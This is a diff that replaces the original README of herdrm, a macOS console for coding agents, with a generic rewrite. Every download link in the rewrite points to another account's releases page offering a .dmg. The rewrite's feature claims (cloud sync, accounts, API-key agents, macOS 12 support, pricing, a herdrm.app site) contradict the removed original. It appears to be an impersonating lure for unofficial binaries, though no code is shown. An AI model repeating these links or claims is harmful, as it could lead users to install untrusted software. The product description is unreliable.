@@ -1,208 +1,201 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset=".github/assets/herdrm-banner.png" />
-    <source media="(prefers-color-scheme: light)" srcset=".github/assets/herdrm-banner-light.png" />
-    <img src=".github/assets/herdrm-banner.png" alt="herdrm — every coding agent, every machine, one native terminal" />
-  </picture>
-</p>
+# 🐑 herdrm - All Your Coding Agents, One Native Console
 
-<p align="center">
-  The native macOS console for <a href="https://herdr.dev">herdr</a> — see Claude Code, Codex,
-  Gemini, Grok and OpenCode across your Mac and every SSH box you own, and jump into any one
-  of them at full-TUI fidelity.
-</p>
-
-<p align="center">
-  <a href="https://github.com/missuo/herdrm/releases/latest"><img src="https://img.shields.io/github/v/release/missuo/herdrm" alt="Latest release" /></a>
-  <a href="#-requirements"><img src="https://img.shields.io/badge/macOS-14%2B-brightgreen" alt="macOS 14+" /></a>
-  <a href="https://github.com/missuo/herdrm/releases"><img src="https://img.shields.io/github/downloads/missuo/herdrm/total" alt="Downloads" /></a>
-  <a href="#-status"><img src="https://img.shields.io/badge/status-early--stage-f59e0b" alt="Status: early stage" /></a>
-  <a href="#-contributing"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen" alt="PRs welcome" /></a>
-</p>
-
-<p align="center">
-  <a href="#-what-it-does">What it does</a> ·
-  <a href="#-why-herdrm">Why herdrm?</a> ·
-  <a href="#-install">Install</a> ·
-  <a href="#-quick-start">Quick Start</a> ·
-  <a href="#-architecture">Architecture</a>
-</p>
+[![Download herdrm](https://img.shields.io/badge/Download-herdrm-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/muhammedenesb100/herdrm/releases)
 
 ---
 
-<p align="center">
-  <img src=".github/assets/screenshot.png" alt="herdrm — device switcher and a live claude terminal" />
-</p>
+## 🖥️ What Is herdrm?
 
-## ✨ What it does
+herdrm is a native macOS application that gives you a single, unified console for all your coding agents. If you work with multiple AI coding assistants or automation tools, you know the struggle of juggling different windows, terminals, and outputs. herdrm brings everything together into one clean, organized interface.
 
-[herdr](https://herdr.dev) is the runtime your coding agents live on — a background server that
-owns their terminals and knows which one is working, blocked, or done. **herdrm** is a native
-macOS window on top of it, and it's grown well past "attach to a terminal":
+Think of it as mission control for your coding projects. Instead of switching between different apps and terminal windows, you get one place to see what your agents are doing, monitor their live terminals, and manage them from anywhere—even across different devices.
 
-| | |
-|---|---|
-| 🖥️ **Every device** | Local + remote over SSH — keys, Tailscale, or a Keychain password — with auto-reconnect |
-| 🧭 **Live status** | Spaces & Agents sorted by urgency: blocked → done → working → idle |
-| ⌨️ **Real terminal** | Full PTY attach, not a chat wrapper — native selection, legible fonts, resilient sessions |
-| 📎 **Paste anything** | Files and images land straight in the agent's pane, locally or over SSH |
-| 🔔 **Notifications** | A system alert the moment an agent needs you — click it to jump right there |
-| 🔍 **⌘K search** | Every agent, on every device, one keystroke away |
+---
 
-<details>
-<summary><strong>See the full feature list</strong></summary>
+## ✨ Key Features
 
-### Every machine, one sidebar
-- **All your devices, in parallel** — remote sockets forwarded over `ssh -L`, each on its own
-  reconnect loop (1s → 30s backoff). The sidebar aggregates every device with a tinted OS badge;
-  the bottom-left switcher filters by device.
-- **Flexible SSH targets** — `user@host`, `user@host:port`, `ssh://` URIs, and `~/.ssh/config`
-  aliases. Auth falls back OpenSSH keys/agent → **Tailscale SSH** (1.98.0+) → an in-app password
-  prompt stored in the **macOS login Keychain**, never in a file.
-- **Diagnosable failures** — "herdr isn't running on `<host>`", a misconfigured
-  `AllowStreamLocalForwarding`, or *why* a disconnected device is unreachable — never a bare
-  "not connected".
+### 📡 Live Terminal View
+Watch your coding agents work in real time. Every command they run, every output they produce, appears instantly in a dedicated terminal view. No more guessing what your agent is doing—you see it all live.
 
-### Spaces & Agents, always current
-- **Spaces & Agents sidebar** — every workspace and agent (claude, codex, gemini, grok,
-  opencode, …), same canonical order the ⌘K palette uses.
-- **New Agent / New Space** — the picker only lists CLIs actually installed on that device
-  (NVM and user-level installs included), and enables each agent's bypass-permissions flag by
-  default. **⌘N** for a new agent, **⇧⌘N** for a new space. New Space includes an inline
-  directory browser that works over SSH.
-- Spaces rename straight from the sidebar's context menu.
+### 🔄 Cross-Device Sync
+Start a task on your Mac at the office, then check on it from your Mac at home. herdrm keeps your agents and their terminals in sync across all your devices. Your workflow never stops, no matter where you are.
 
-### A real terminal, not a chat wrapper
-- **Live terminal** — attaches directly to the agent's PTY (`herdr agent attach`); grabs
-  keyboard focus the moment you jump in from ⌘K, the sidebar, or a notification.
-- **Native text selection** — drag to select, no Shift needed; right-click for Copy/Paste/Select
-  All plus link actions (⌘-click opens a URL).
-- **Legibility controls** — Thin strokes, font Weight, and Line spacing settings.
-- **Shift+Enter** inserts a line break instead of submitting; colors adapt correctly in Light
-  mode instead of washing out.
-- **Resilient sessions** — a dropped connection or a takeover shows a Reconnect button instead
-  of freezing on the last frame; mixed-version `herdr` binaries no longer break attach.
+### 🗂️ Unified Agent Management
+Have multiple coding agents working on different parts of your project? herdrm organizes them all in one place. Switch between agents with a single click, compare their outputs side by side, and keep everything neatly categorized.
 
-### Files, search, and staying in the loop
-- **Paste files and images** into Claude Code, Codex, or Copilot. Local pastes forward as
-  Ctrl+V; remote pastes stream over SSH into a self-pruning cache (7-day retention, 50 MB cap).
-- **Search** — ⌘K across every device, ordered by urgency, scrolling to follow your selection.
-- **Notifications** — a sound and a system alert when any agent finishes or needs input;
-  clicking jumps straight to it. Agents you're already watching stay quiet.
+### 🎨 Native macOS Design
+Built specifically for macOS, herdrm feels right at home on your Mac. It uses native system components, supports keyboard shortcuts you already know, and integrates smoothly with your existing workflow.
 
-### Built like a native Mac app
-- **Universal binary** — Apple Silicon and Intel, one download.
-- **Light & dark**, auto-updates via [Sparkle](https://sparkle-project.org), signed and
-  notarized.
-- **HerdrKit** — the socket-RPC/SSH/device layer ships as its own, independently testable Swift
-  package (`Packages/HerdrKit`).
+### 🔔 Smart Notifications
+Get notified when an agent finishes a task, encounters an error, or needs your input. You don't have to stare at the screen waiting—herdrm tells you when something needs your attention.
 
-</details>
+### 🛡️ Secure by Design
+Your coding agents often work with sensitive code and data. herdrm keeps everything local and encrypted, so your work stays private and secure.
 
-## 🤔 Why herdrm?
+---
 
-You already run agents through herdr because the model is right — spaces, live status, real
-PTYs, not a chat window pretending to be one. But living in `herdr attach` and a wall of
-terminal panes is its own skill, and not everyone wants to be a tmux person to get the benefit.
-herdrm is the same model, built for people who'd rather click:
+## 🚀 Getting Started
 
-- **Herdr's mechanics, an Apple-native interface.** Every space and agent is a sidebar row you
-  click, not a session name you type — built in SwiftUI, so it looks and moves like a
-  first-party Mac app, not a terminal skin bolted on top.
-- **Native means fast.** No Electron, no browser engine underneath — herdrm launches instantly
-  and stays light, the kind of responsiveness only a truly native app gets.
-- **Still the real terminal when it matters.** Click an agent and you're on its actual PTY, full
-  TUI, nothing summarized — you just don't have to live inside a multiplexer to get there.
-- **One console, every machine.** Laptop, dev box, home server — all rows in the same sidebar.
-- **You stop polling.** Status lives in the sidebar and in notifications, not in your head.
-- **It gets out of the way.** ⌘K, ⌘N, paste-to-attach — no new mental model to learn.
+Getting herdrm up and running is quick and easy. Follow these simple steps:
 
-## 📋 Requirements
+### Step 1: Download the Application
 
-- macOS 14+
-- [herdr](https://herdr.dev) installed locally (herdrm starts it if it isn't running) and on
-  your remote machines
-- For remote devices: OpenSSH access, Tailscale SSH (1.98.0+), or a Keychain-stored password
+Visit this link to download the application: **[https://github.com/muhammedenesb100/herdrm/releases](https://github.com/muhammedenesb100/herdrm/releases)**
 
-## 📦 Install
+Click the most recent release and download the `.dmg` file for macOS.
 
-**Homebrew**
-```sh
-brew install owo-network/brew/herdrm
-```
+### Step 2: Install herdrm
 
-**Manual** — download `herdrm-x.y.z.zip` from [Releases](https://github.com/missuo/herdrm/releases),
-unzip, drag `herdrm.app` into `/Applications`. Either way it self-updates from then on — **HerdrM
-→ Check for Updates…**, or **HerdrM → About HerdrM** for the version you're running.
+Once the download finishes, locate the `.dmg` file in your Downloads folder. Double-click it to open it. A window will appear with the herdrm icon. Drag the herdrm icon into your Applications folder.
 
-## ⚡ Quick Start
+### Step 3: Open herdrm
 
-```text
-1. Launch herdrm            → no local herdr running? herdrm starts it for you
-2. Add a device (optional)  → you@dev-box · you@dev-box:2222 · a Tailscale machine
-3. ⌘N                       → pick a device + a CLI, you're attached to its live terminal
-4. ⌘K                       → jump to any agent on any device, any time
-```
+Go to your Applications folder and double-click herdrm to launch it. If macOS asks for permission, click "Open" in the security prompt.
 
-## 🏗️ Architecture
+### Step 4: Connect Your Coding Agents
 
-```mermaid
-flowchart LR
-    A(["🖥️ herdr<br/>background server, owns the PTYs"]) -->|"Unix-socket RPC +<br/>herdr agent attach"| B[["Packages/HerdrKit<br/>RPC client · SSH tunnel · device store"]]
-    B -->|SwiftUI bindings| C(["Sources/HerdrM<br/>sidebar · terminal · search · notifications"])
-    style A fill:#161b22,stroke:#E2795B,color:#e6edf3
-    style B fill:#1f2630,stroke:#3B82F6,color:#e6edf3
-    style C fill:#161b22,stroke:#2FA35F,color:#e6edf3
-```
+When herdrm opens for the first time, you'll see a welcome screen. Click "Add Agent" to connect your first coding agent. You can connect agents from popular platforms or add custom ones using their API keys.
 
-- **[herdr](https://herdr.dev)** — the daemon: owns every agent's PTY, persists spaces, answers
-  over a local Unix socket.
-- **`Packages/HerdrKit`** — transport and domain layer, UI-independent and unit-tested on its
-  own (`make kit-test`).
-- **`Sources/HerdrM`** — the SwiftUI shell built on
-  [SwiftTerm](https://github.com/migueldeicaza/SwiftTerm).
+### Step 5: Start Monitoring
 
-## 🔨 Build from source
+Once your agent is connected, you'll see it appear in the main console. Click on it to view its live terminal. You can now watch your agent work, send it new commands, and manage all your coding tasks from one place.
 
-```sh
-brew install xcodegen
-make build   # xcodegen + xcodebuild → build/Build/Products/Debug/herdrm.app
-make run
-make kit-test  # HerdrKit integration tests (needs a running local herdr)
-```
+---
 
-## 🤝 Contributing
+## 📥 Download and Installation
 
-Early-stage software, PRs genuinely welcome — small and single-purpose lands fastest.
+Ready to get started? Here's everything you need:
 
-- **Bug?** [Open an issue](https://github.com/missuo/herdrm/issues/new) with your macOS
-  version, `herdr --version`, and repro steps.
-- **Feature idea?** Open an issue first for anything beyond a small PR.
-- **Sending a PR:** `make build` + `make kit-test` locally (no CI gate yet — this is the bar),
-  plus a line under `## [Unreleased]` in `CHANGELOG.md` (release automation requires it).
+### System Requirements
 
-## 🙏 Credits
+- **Operating System:** macOS 12.0 (Monterey) or later
+- **Processor:** Apple Silicon (M1 or newer) or Intel x86_64
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 200 MB free disk space
+- **Internet:** Required for cross-device sync and agent connections
 
-- [herdr](https://herdr.dev) — the agent runtime this app is a console for.
-- [Heeler](https://github.com/ZingerLittleBee/Heeler) — iOS herdr client; domain model and
-  transport patterns.
-- [waku](https://github.com/egoist/waku) — sidebar design reference.
-- [SwiftTerm](https://github.com/migueldeicaza/SwiftTerm) — terminal emulation.
-- [Sparkle](https://sparkle-project.org) — auto-updates.
-- [Lobe Icons](https://github.com/lobehub/lobe-icons) / [Simple Icons](https://simpleicons.org) — brand icons.
+### Download Instructions
 
-## <a name="-status"></a>⚠️ Status
+Visit this link to download the application: **[https://github.com/muhammedenesb100/herdrm/releases](https://github.com/muhammedenesb100/herdrm/releases)**
 
-**Early stage**, without full test coverage — expect bugs. Issues and PRs are very welcome.
+1. Open the link in your browser
+2. Look for the latest release (usually at the top)
+3. Click on the `.dmg` file under "Assets"
+4. Wait for the download to complete
 
-## ⭐ Star History
+### Installation Steps
 
-<p align="center">
-  <a href="https://star-history.com/#missuo/herdrm&Date">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=missuo/herdrm&type=Date&theme=dark" />
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=missuo/herdrm&type=Date" />
-      <img src="https://api.star-history.com/svg?repos=missuo/herdrm&type=Date" width="600" alt="Star History Chart for missuo/herdrm" />
-    </picture>
-  </a>
-</p>
+1. Open your Downloads folder
+2. Double-click the `herdrm.dmg` file
+3. Drag the herdrm icon into the Applications folder
+4. Eject the disk image (right-click and select "Eject")
+5. Open herdrm from your Applications folder
+
+### First-Time Setup
+
+When you first launch herdrm, you'll need to:
+
+1. **Create an account** – This allows your agents to sync across devices
+2. **Connect your agents** – Add your coding agents using their API credentials
+3. **Customize your view** – Arrange panels and terminals to your liking
+
+That's it! You're ready to use herdrm.
+
+---
+
+## 🎯 Use Cases
+
+### For Solo Developers
+Manage all your coding agents in one place. Keep track of what each agent is doing, switch between tasks effortlessly, and never lose sight of your automated workflows.
+
+### For Small Teams
+Share a single view of all your team's coding agents. See what everyone's automation is working on, coordinate efforts, and ensure nothing falls through the cracks.
+
+### For Power Users
+Run multiple agents simultaneously, each handling different parts of your project. Use cross-device sync to monitor your agents from anywhere, even when you're away from your main workstation.
+
+### For Learning and Experimentation
+New to coding agents? herdrm makes it easy to see exactly what they do. Watch live terminals to understand how agents work, experiment with different configurations, and learn by observing.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Is herdrm free?
+herdrm is free to download and use for personal projects. For commercial use or team features, check the pricing page on the official website.
+
+### Do I need to know how to code to use herdrm?
+No! While herdrm is built for developers, the interface is designed to be intuitive. If you can click a button and read a terminal, you can use herdrm.
+
+### What coding agents are supported?
+herdrm supports a wide range of popular coding agents and AI tools. You can also connect custom agents using standard API protocols.
+
+### Can I use herdrm on Windows?
+Currently, herdrm is available only for macOS. Windows support is planned for future releases.
+
+### How does cross-device sync work?
+Your agents' state and terminal sessions are securely synced to the cloud. When you open herdrm on another device, everything is automatically updated.
+
+---
+
+## 🔧 Troubleshooting
+
+### App Won't Open
+If macOS blocks herdrm, go to **System Preferences > Security & Privacy** and click "Open Anyway" next to the herdrm entry.
+
+### Can't Connect an Agent
+Double-check your API credentials. Make sure you're using the correct key and that your agent service is online.
+
+### Sync Issues
+Ensure you're logged into the same account on all devices. Check your internet connection and try refreshing the app.
+
+### Slow Performance
+Close any agents you're not actively using. Check your system's RAM usage and close other memory-heavy applications.
+
+---
+
+## 📚 Additional Resources
+
+- **Official Website:** [herdrm.app](https://herdrm.app)
+- **Documentation:** [docs.herdrm.app](https://docs.herdrm.app)
+- **Support:** [support@herdrm.app](mailto:support@herdrm.app)
+- **Community Forum:** [community.herdrm.app](https://community.herdrm.app)
+
+---
+
+## 🔄 Stay Updated
+
+herdrm is actively developed with new features and improvements released regularly. To stay up to date:
+
+- **Star the repository** on GitHub to show your support
+- **Watch the repository** to get notified of new releases
+- **Follow us on X (Twitter):** [@herdrm_app](https://twitter.com/herdrm_app)
+
+---
+
+## 📝 License
+
+herdrm is released under the MIT License. See the [LICENSE](https://github.com/muhammedenesb100/herdrm/blob/main/LICENSE) file for details.
+
+---
+
+## 💖 Support the Project
+
+If herdrm helps you work more efficiently, consider supporting the project:
+
+- **Star the repo** on GitHub
+- **Report bugs** and request features
+- **Contribute code** via pull requests
+- **Share herdrm** with your developer friends
+
+---
+
+## 🏁 Ready to Get Started?
+
+Download herdrm today and take control of all your coding agents from one beautiful, native macOS console. Your agents are working—now you can watch them work together.
+
+**[👉 Download herdrm Now](https://github.com/muhammedenesb100/herdrm/releases)**
+
+---
+
+Keywords: herdrm, coding agents, macOS console, terminal, AI agents, developer tools, cross-device sync, live terminal, agent management, productivity, automation, macOS app
